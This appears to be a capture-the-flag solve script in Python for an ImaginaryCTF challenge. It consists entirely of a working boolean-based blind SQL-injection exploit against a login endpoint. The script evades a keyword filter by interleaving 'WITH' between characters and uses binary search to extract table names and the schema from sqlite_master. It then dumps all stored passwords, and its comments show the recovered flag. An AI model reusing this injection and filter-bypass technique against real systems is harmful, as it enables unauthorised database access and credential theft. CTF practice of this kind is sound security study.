import httpx

client = httpx.Client(http2=True)


def login(username, password):
    resp = client.post(
        "https://awkward-bypass.chal.imaginaryctf.org/user",
        params={"username": username, "password": password},
        allow_redirects=False,
    )
    return "Error" not in resp.text


def bypass(s):
    return "WITH".join(s)


def sqli(s):
    return login("a", bypass(s))


def binary_search(f, l=0, r=100):
    while True:
        print(l, r)
        if l == r:
            return l
        m = (l + r) // 2
        if f(m):
            r = m
        else:
            l = m + 1


def get_string_len(s, mx=100):
    return binary_search(
        lambda m: sqli(f"' union select 1,2 where length(({s}))<={m} and ''='"), r=mx
    )


def get_string(s):
    l = get_string_len(s)
    ret = ""
    for i in range(1, l + 1):
        c = binary_search(
            lambda m: sqli(
                f"' union select 1,2 where unicode(substr(({s}),{i},{i}))<={m} and ''='"
            ),
            l=32,
            r=128,
        )
        ret += chr(c)
        print(ret)
    return ret


# print(
#     get_string(
#         "SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'"
#     )
# )
# -> users

# print(
#     get_string(
#         "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'"
#     )
# )
# -> CREATE TABLE users (username, password)

print(get_string("SELECT group_concat(password) FROM users"))
# -> ictf{n1c3_fil73r_byp@ss_7130676d}
